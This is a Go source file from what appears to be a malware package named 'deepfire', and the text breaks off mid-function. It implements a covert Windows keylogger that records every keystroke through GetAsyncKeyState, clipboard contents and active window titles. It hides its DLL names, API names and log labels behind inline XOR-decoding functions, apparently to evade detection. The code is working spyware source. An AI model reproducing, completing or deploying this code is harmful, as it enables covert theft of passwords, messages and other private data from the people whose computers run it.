package deepfire

import (
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/atotto/clipboard"
)

var tmpPath string = os.Getenv((func() string {
mask := []byte("\x93\xae\xc2\xdc\x0a\xe5\xf4")
maskedStr := []byte("\xd2\xfe\x92\x98\x4b\xb1\xb5")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())) + (func() string {
mask := []byte("\x63\x85\xd3\xcd\x07\x36\x85\x5f\xd6\xf0\xdb\x8f")
maskedStr := []byte("\x3f\xee\xb6\xb4\x6b\x59\xe2\x2c\xf8\x9c\xb4\xe8")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())

var tmpKeylog string
var tmpTitle string

func startLogger(mode int) {
	if mode == 0 { //Normal logger (everything until told to stop)
		go windowLogger()
		go keyLogger()
		go clipboardLogger()
	} else {
		//Selective Keylogger
	}
}

var user32 = syscall.NewLazyDLL(deobfuscate((func() string {
mask := []byte("\xf1\x13\x36\x68\x02\x1e\xcc\xe0\x66\x39")
maskedStr := []byte("\x87\x67\x50\x1b\x36\x2d\xe3\x85\x0b\x54")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())))                       //user32.dll
var kernel32 = syscall.NewLazyDLL(deobfuscate((func() string {
mask := []byte("\xaa\xe8\x77\xb9\x9b\xb1\xdf\xcd\x24\x21\xca\xfc")
maskedStr := []byte("\xc6\x8e\x04\xd6\xfd\xdc\xeb\xfe\x0b\x44\xa7\x91")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())))                   //kernel32.dll
var procGetForegroundWindow = user32.NewProc(deobfuscate((func() string {
mask := []byte("\x15\x32\xfc\x71\x41\x53\x20\x3c\x9a\x26\x5e\x35\x58\x6e\x97\xc3\xee\x5a\x8f")
maskedStr := []byte("\x5d\x54\x89\x36\x31\x20\x46\x54\xe9\x56\x28\x5a\x3d\x36\xfd\xac\x8b\x2a\xf7")
res := make([]byte, 19)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))) //GetForegroundWindow
var procGetWindowTextW = user32.NewProc(deobfuscate((func() string {
mask := []byte("\x6c\x26\x9c\xd9\xb0\x54\xce\x57\x3d\xdc\x41\x56\xe6\xbe")
maskedStr := []byte("\x24\x40\xe9\x81\xda\x3b\xab\x27\x45\x89\x27\x2f\x93\xe6")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())))           //GetWindowTextW
var procShowWindow = user32.NewProc(deobfuscate((func() string {
mask := []byte("\x7a\x20\xef\x04\xf6\x14\x4f\x21\x78\x5a")
maskedStr := []byte("\x2e\x49\x9f\x7c\xae\x7e\x20\x44\x08\x22")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())))                   //ShowWindow
var procEnumWindows = user32.NewProc(deobfuscate((func() string {
mask := []byte("\x55\x66\xa1\x3d\xf8\x7d\x5c\x10\x3c\x3f\x28")
maskedStr := []byte("\x13\x09\xd7\x53\xa0\x17\x33\x75\x4c\x47\x5c")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())))                 //EnumWindows
var procGetAsyncKeyState = user32.NewProc(deobfuscate((func() string {
mask := []byte("\x4c\x05\x62\x3f\xda\xbf\x11\xa7\x02\x8e\xc8\x4f\xc2\x4a\x86\xe4")
maskedStr := []byte("\x04\x63\x17\x7d\xae\xc5\x7e\xc3\x4e\xe8\xb2\x1b\xb7\x28\xf3\x82")
res := make([]byte, 16)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())))       //GetAsyncKeyState
var caps bool
var shift bool

//Get Active Window Title
func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	for {
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		if syscall.UTF16ToString(b) != (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) {
			if tmpTitle != syscall.UTF16ToString(b) {
				tmpTitle = syscall.UTF16ToString(b)
				tmpPath += string((func() string {
mask := []byte("\xfd\xd4\xac")
maskedStr := []byte("\xf0\xde\xf7")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) + syscall.UTF16ToString(b) + (func() string {
mask := []byte("\x37\x10\xd7")
maskedStr := []byte("\x6a\x1d\xdd")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
			}
		}
		time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
	}
}

func clipboardLogger() {
	tmp := (func() string {
mask := []byte("")
maskedStr := []byte("")
res := make([]byte, 0)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
	for {
		text, _ := clipboard.ReadAll()
		if text != tmp {
			tmp = text
			tmpKeylog += string((func() string {
mask := []byte("\x60\x05\x97\xe0\x08\xd8\xb6\xaa\x08\xc9\xd5\x1f\x08\x96")
maskedStr := []byte("\x6d\x0f\xcc\xa3\x64\xb1\xc6\xc8\x67\xa8\xa7\x7b\x32\xb6")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()) + text + (func() string {
mask := []byte("\xc5\x94\x5e")
maskedStr := []byte("\x98\x99\x54")
res := make([]byte, 3)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()))
		}
		time.Sleep(time.Duration(randInt(1, 5)) * time.Second)
	}
}

const (
	// Virtual-Key Codes
	vk_BACK       = 0x08
	vk_TAB        = 0x09
	vk_CLEAR      = 0x0C
	vk_RETURN     = 0x0D
	vk_SHIFT      = 0x10
	vk_CONTROL    = 0x11
	vk_MENU       = 0x12
	vk_PAUSE      = 0x13
	vk_CAPITAL    = 0x14
	vk_ESCAPE     = 0x1B
	vk_SPACE      = 0x20
	vk_PRIOR      = 0x21
	vk_NEXT       = 0x22
	vk_END        = 0x23
	vk_HOME       = 0x24
	vk_LEFT       = 0x25
	vk_UP         = 0x26
	vk_RIGHT      = 0x27
	vk_DOWN       = 0x28
	vk_SELECT     = 0x29
	vk_PRINT      = 0x2A
	vk_EXECUTE    = 0x2B
	vk_SNAPSHOT   = 0x2C
	vk_INSERT     = 0x2D
	vk_DELETE     = 0x2E
	vk_LWIN       = 0x5B
	vk_RWIN       = 0x5C
	vk_APPS       = 0x5D
	vk_SLEEP      = 0x5F
	vk_NUMPAD0    = 0x60
	vk_NUMPAD1    = 0x61
	vk_NUMPAD2    = 0x62
	vk_NUMPAD3    = 0x63
	vk_NUMPAD4    = 0x64
	vk_NUMPAD5    = 0x65
	vk_NUMPAD6    = 0x66
	vk_NUMPAD7    = 0x67
	vk_NUMPAD8    = 0x68
	vk_NUMPAD9    = 0x69
	vk_MULTIPLY   = 0x6A
	vk_ADD        = 0x6B
	vk_SEPARATOR  = 0x6C
	vk_SUBTRACT   = 0x6D
	vk_DECIMAL    = 0x6E
	vk_DIVIDE     = 0x6F
	vk_F1         = 0x70
	vk_F2         = 0x71
	vk_F3         = 0x72
	vk_F4         = 0x73
	vk_F5         = 0x74
	vk_F6         = 0x75
	vk_F7         = 0x76
	vk_F8         = 0x77
	vk_F9         = 0x78
	vk_F10        = 0x79
	vk_F11        = 0x7A
	vk_F12        = 0x7B
	vk_NUMLOCK    = 0x90
	vk_SCROLL     = 0x91
	vk_LSHIFT     = 0xA0
	vk_RSHIFT     = 0xA1
	vk_LCONTROL   = 0xA2
	vk_RCONTROL   = 0xA3
	vk_LMENU      = 0xA4
	vk_RMENU      = 0xA5
	vk_OEM_1      = 0xBA
	vk_OEM_PLUS   = 0xBB
	vk_OEM_COMMA  = 0xBC
	vk_OEM_MINUS  = 0xBD
	vk_OEM_PERIOD = 0xBE
	vk_OEM_2      = 0xBF
	vk_OEM_3      = 0xC0
	vk_OEM_4      = 0xDB
	vk_OEM_5      = 0xDC
	vk_OEM_6      = 0xDD
	vk_OEM_7      = 0xDE
	vk_OEM_8      = 0xDF
)

func keyLogger() {
	for {
		time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
		shiftchk, _, _ := procGetAsyncKeyState.Call(uintptr(vk_SHIFT))
		if shiftchk == 0x8000 {
			shift = true
		} else {
			shift = false
		}
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if int(Val) == -32767 {
				switch KEY {
				case vk_CONTROL:
					tmpKeylog += (func() string {
mask := []byte("\x79\xb2\x21\xf1\x95\x62")
maskedStr := []byte("\x22\xf1\x55\x83\xf9\x3f")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_BACK:
					tmpKeylog += (func() string {
mask := []byte("\xbe\x4c\x24\x0b\x1c\xbe")
maskedStr := []byte("\xe5\x0e\x45\x68\x77\xe3")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_TAB:
					tmpKeylog += (func() string {
mask := []byte("\xbf\x0f\x2d\xc8\x9b")
maskedStr := []byte("\xe4\x5b\x4c\xaa\xc6")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_RETURN:
					tmpKeylog += (func() string {
mask := []byte("\x6e\xf4\x7e\x3b\x8c\x41\x5d\x41\x24")
maskedStr := []byte("\x35\xb1\x10\x4f\xe9\x33\x00\x4c\x2e")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_SHIFT:
					tmpKeylog += (func() string {
mask := []byte("\xf4\x14\x8c\x75\xcb\x0d\x8e")
maskedStr := []byte("\xaf\x47\xe4\x1c\xad\x79\xd3")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_MENU:
					tmpKeylog += (func() string {
mask := []byte("\x08\xea\xd9\xe5\x84")
maskedStr := []byte("\x53\xab\xb5\x91\xd9")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_CAPITAL:
					tmpKeylog += (func() string {
mask := []byte("\x3e\x54\xa0\xd9\x22\xf5\xb8\x0d\xed\x3a")
maskedStr := []byte("\x65\x17\xc1\xa9\x51\xb9\xd7\x6e\x86\x67")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					if caps {
						caps = false
					} else {
						caps = true
					}
				case vk_ESCAPE:
					tmpKeylog += (func() string {
mask := []byte("\x7f\x93\x06\xf8\xc8")
maskedStr := []byte("\x24\xd6\x75\x9b\x95")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_SPACE:
					tmpKeylog += (func() string {
mask := []byte("\x4a")
maskedStr := []byte("\x6a")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_PRIOR:
					tmpKeylog += (func() string {
mask := []byte("\x60\x15\x65\x06\x43\xff\x3a\x50")
maskedStr := []byte("\x3b\x45\x04\x61\x26\xaa\x4a\x0d")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NEXT:
					tmpKeylog += (func() string {
mask := []byte("\xfe\xce\xe0\x15\x1f\x03\x7f\x2b\xb1\x04")
maskedStr := []byte("\xa5\x9e\x81\x72\x7a\x47\x10\x5c\xdf\x59")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_END:
					tmpKeylog += (func() string {
mask := []byte("\x07\x9c\xcd\x9b\xea")
maskedStr := []byte("\x5c\xd9\xa3\xff\xb7")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_HOME:
					tmpKeylog += (func() string {
mask := []byte("\xce\xc7\xab\x96\xd5\x42")
maskedStr := []byte("\x95\x8f\xc4\xfb\xb0\x1f")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_LEFT:
					tmpKeylog += (func() string {
mask := []byte("\x88\x93\xbb\xd0\x2b\x74")
maskedStr := []byte("\xd3\xdf\xde\xb6\x5f\x29")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_UP:
					tmpKeylog += (func() string {
mask := []byte("\x06\x68\x3e\xe2")
maskedStr := []byte("\x5d\x3d\x4e\xbf")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_RIGHT:
					tmpKeylog += (func() string {
mask := []byte("\x80\xda\x78\x10\x94\x47\x3c")
maskedStr := []byte("\xdb\x88\x11\x77\xfc\x33\x61")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_DOWN:
					tmpKeylog += (func() string {
mask := []byte("\x7b\xa1\x8f\x27\x55\xd7")
maskedStr := []byte("\x20\xe5\xe0\x50\x3b\x8a")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_SELECT:
					tmpKeylog += (func() string {
mask := []byte("\x37\xa9\x5f\xdd\x1d\xe1\xf4\x03")
maskedStr := []byte("\x6c\xfa\x3a\xb1\x78\x82\x80\x5e")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_PRINT:
					tmpKeylog += (func() string {
mask := []byte("\xa8\x99\xc2\xd0\x86\x61\x3a")
maskedStr := []byte("\xf3\xc9\xb0\xb9\xe8\x15\x67")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_EXECUTE:
					tmpKeylog += (func() string {
mask := []byte("\xed\x70\xdb\xbb\x74\xae\xa5\x2c\x16")
maskedStr := []byte("\xb6\x35\xa3\xde\x17\xdb\xd1\x49\x4b")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_SNAPSHOT:
					tmpKeylog += (func() string {
mask := []byte("\xa0\xc7\x80\x87\x8b\x0a\xf1\x8f\x98\x9d\x60\x01\xc2")
maskedStr := []byte("\xfb\x97\xf2\xee\xe5\x7e\xa2\xec\xea\xf8\x05\x6f\x9f")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_INSERT:
					tmpKeylog += (func() string {
mask := []byte("\xe0\x62\x78\xdd\xe8\x87\xa5\xca")
maskedStr := []byte("\xbb\x2b\x16\xae\x8d\xf5\xd1\x97")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_DELETE:
					tmpKeylog += (func() string {
mask := []byte("\xbb\xc8\x9f\x2f\xaf\x66\xe8\xb9")
maskedStr := []byte("\xe0\x8c\xfa\x43\xca\x12\x8d\xe4")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_LWIN:
					tmpKeylog += (func() string {
mask := []byte("\x48\x0d\x31\xb5\x8e\xaa\x48\x6a\x74\xcb\xc5\x9e\x1c")
maskedStr := []byte("\x13\x41\x54\xd3\xfa\xfd\x21\x04\x10\xa4\xb2\xed\x41")
res := make([]byte, 13)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_RWIN:
					tmpKeylog += (func() string {
mask := []byte("\x1d\xe5\x1d\x89\x0a\x4b\x10\x12\xaa\xfb\x08\x6b\x10\x62")
maskedStr := []byte("\x46\xb7\x74\xee\x62\x3f\x47\x7b\xc4\x9f\x67\x1c\x63\x3f")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_APPS:
					tmpKeylog += (func() string {
mask := []byte("\x55\x94\xa1\x38\xb0\x4d\x3f\xb1\xa8\xfc\xa2\x0e\x6c\x6b")
maskedStr := []byte("\x0e\xd5\xd1\x48\xdc\x24\x5c\xd0\xdc\x95\xcd\x60\x1f\x36")
res := make([]byte, 14)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_SLEEP:
					tmpKeylog += (func() string {
mask := []byte("\x65\x73\x2d\x61\x47\x24\xb9")
maskedStr := []byte("\x3e\x20\x41\x04\x22\x54\xe4")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD0:
					tmpKeylog += (func() string {
mask := []byte("\xbb\xa0\x4a\xf8\x05\xf4\x74")
maskedStr := []byte("\xe0\xf0\x2b\x9c\x25\xc4\x29")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD1:
					tmpKeylog += (func() string {
mask := []byte("\x1b\x06\x99\x93\x63\x4a\xf7")
maskedStr := []byte("\x40\x56\xf8\xf7\x43\x7b\xaa")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD2:
					tmpKeylog += (func() string {
mask := []byte("\x9d\x43\x23\x00\x30\x39\x5a")
maskedStr := []byte("\xc6\x13\x42\x64\x10\x0b\x07")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD3:
					tmpKeylog += (func() string {
mask := []byte("\x65\x8a\xa4\x13\xf1\x6a\x29")
maskedStr := []byte("\x3e\xda\xc5\x77\xd1\x59\x74")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD4:
					tmpKeylog += (func() string {
mask := []byte("\xb7\x16\x24\xdd\xdb\xf7\x75")
maskedStr := []byte("\xec\x46\x45\xb9\xfb\xc3\x28")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD5:
					tmpKeylog += (func() string {
mask := []byte("\x05\x94\x48\x76\x5f\xc9\x8d")
maskedStr := []byte("\x5e\xc4\x29\x12\x7f\xfc\xd0")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD6:
					tmpKeylog += (func() string {
mask := []byte("\x52\x27\x17\x5b\x7b\x9e\x7a")
maskedStr := []byte("\x09\x77\x76\x3f\x5b\xa8\x27")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD7:
					tmpKeylog += (func() string {
mask := []byte("\x2a\x8a\x9a\xd2\x55\x20\x6d")
maskedStr := []byte("\x71\xda\xfb\xb6\x75\x17\x30")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD8:
					tmpKeylog += (func() string {
mask := []byte("\x72\xe8\x89\x5c\x9e\x61\x48")
maskedStr := []byte("\x29\xb8\xe8\x38\xbe\x59\x15")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMPAD9:
					tmpKeylog += (func() string {
mask := []byte("\x58\x1b\x64\x80\x94\x8f\xff")
maskedStr := []byte("\x03\x4b\x05\xe4\xb4\xb6\xa2")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_MULTIPLY:
					tmpKeylog += (func() string {
mask := []byte("\xab")
maskedStr := []byte("\x81")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_ADD:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\xb3")
maskedStr := []byte("\x98")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x58")
maskedStr := []byte("\x65")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_SEPARATOR:
					tmpKeylog += (func() string {
mask := []byte("\x12\x91\x7d\xeb\xba\x4f\xf2\x01\x6b\xcd\xff")
maskedStr := []byte("\x49\xc2\x18\x9b\xdb\x3d\x93\x75\x04\xbf\xa2")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_SUBTRACT:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x44")
maskedStr := []byte("\x1b")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xb7")
maskedStr := []byte("\x9a")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_DECIMAL:
					tmpKeylog += (func() string {
mask := []byte("\xd7")
maskedStr := []byte("\xf9")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_DIVIDE:
					tmpKeylog += (func() string {
mask := []byte("\xc7\x19\xae\x12\x9a\x65\x48\x18")
maskedStr := []byte("\x9c\x5d\xcb\x64\xf3\x01\x2d\x45")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F1:
					tmpKeylog += (func() string {
mask := []byte("\xd7\x10\x30\x2d")
maskedStr := []byte("\x8c\x56\x01\x70")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F2:
					tmpKeylog += (func() string {
mask := []byte("\x72\x76\xc1\x97")
maskedStr := []byte("\x29\x30\xf3\xca")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F3:
					tmpKeylog += (func() string {
mask := []byte("\x4e\xc2\x91\x40")
maskedStr := []byte("\x15\x84\xa2\x1d")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F4:
					tmpKeylog += (func() string {
mask := []byte("\x30\x92\x47\x5e")
maskedStr := []byte("\x6b\xd4\x73\x03")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F5:
					tmpKeylog += (func() string {
mask := []byte("\xcb\xc2\x85\xba")
maskedStr := []byte("\x90\x84\xb0\xe7")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F6:
					tmpKeylog += (func() string {
mask := []byte("\xf4\xef\x47\x3d")
maskedStr := []byte("\xaf\xa9\x71\x60")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F7:
					tmpKeylog += (func() string {
mask := []byte("\x70\x2d\x64\xd8")
maskedStr := []byte("\x2b\x6b\x53\x85")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F8:
					tmpKeylog += (func() string {
mask := []byte("\x63\xad\xb2\x96")
maskedStr := []byte("\x38\xeb\x8a\xcb")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F9:
					tmpKeylog += (func() string {
mask := []byte("\xc4\xf1\x1a\x57")
maskedStr := []byte("\x9f\xb7\x23\x0a")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F10:
					tmpKeylog += (func() string {
mask := []byte("\xb2\xab\xf4\x6e\x1e")
maskedStr := []byte("\xe9\xed\xc5\x5e\x43")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F11:
					tmpKeylog += (func() string {
mask := []byte("\x4e\x4e\x93\x32\xf1")
maskedStr := []byte("\x15\x08\xa2\x03\xac")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_F12:
					tmpKeylog += (func() string {
mask := []byte("\x6c\x76\x1f\xa1\xae")
maskedStr := []byte("\x37\x30\x2e\x93\xf3")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_NUMLOCK:
					tmpKeylog += (func() string {
mask := []byte("\xd6\x5a\x27\x1d\x37\xa9\x2b\x32\x4a")
maskedStr := []byte("\x8d\x14\x52\x70\x7b\xc6\x48\x59\x17")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_SCROLL:
					tmpKeylog += (func() string {
mask := []byte("\xf6\x29\x47\xc0\x29\x69\xce\xa9\x64\x93\xbc\xe4")
maskedStr := []byte("\xad\x7a\x24\xb2\x46\x05\xa2\xe5\x0b\xf0\xd7\xb9")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_LSHIFT:
					tmpKeylog += (func() string {
mask := []byte("\xf0\xcd\x90\xdc\x20\x53\x48\xf3\xdd\xfb\x17")
maskedStr := []byte("\xab\x81\xf5\xba\x54\x00\x20\x9a\xbb\x8f\x4a")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_RSHIFT:
					tmpKeylog += (func() string {
mask := []byte("\xd1\xd5\x68\x02\x0a\x5d\x56\x8d\x65\x8d\x13\xda")
maskedStr := []byte("\x8a\x87\x01\x65\x62\x29\x05\xe5\x0c\xeb\x67\x87")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_LCONTROL:
					tmpKeylog += (func() string {
mask := []byte("\x85\x4e\x18\x3e\x69\x83\x9a\x00\xfa\x33")
maskedStr := []byte("\xde\x02\x7d\x58\x1d\xc0\xee\x72\x96\x6e")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_RCONTROL:
					tmpKeylog += (func() string {
mask := []byte("\x12\xcb\xa1\x5d\xc3\x6c\x6a\x85\xbf\xa2\x49")
maskedStr := []byte("\x49\x99\xc8\x3a\xab\x18\x29\xf1\xcd\xce\x14")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_LMENU:
					tmpKeylog += (func() string {
mask := []byte("\x3c\x04\x16\xd2\xf2\x2e\xca\x84\x20\x29")
maskedStr := []byte("\x67\x48\x73\xb4\x86\x63\xaf\xea\x55\x74")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_RMENU:
					tmpKeylog += (func() string {
mask := []byte("\x9d\x54\x0c\xe2\x4a\x7d\x26\x36\x54\xc2\x7b")
maskedStr := []byte("\xc6\x06\x65\x85\x22\x09\x6b\x53\x3a\xb7\x26")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
				case vk_OEM_1:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x72")
maskedStr := []byte("\x48")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\x3d")
maskedStr := []byte("\x06")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					}
				case vk_OEM_2:
					if shift {
						tmpKeylog += (func() string {
mask := []byte("\x4a")
maskedStr := []byte("\x75")
res := make([]byte, 1)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())
					} else {
						tmpKeylog += (func() string {
mask := []byte("\xa6")
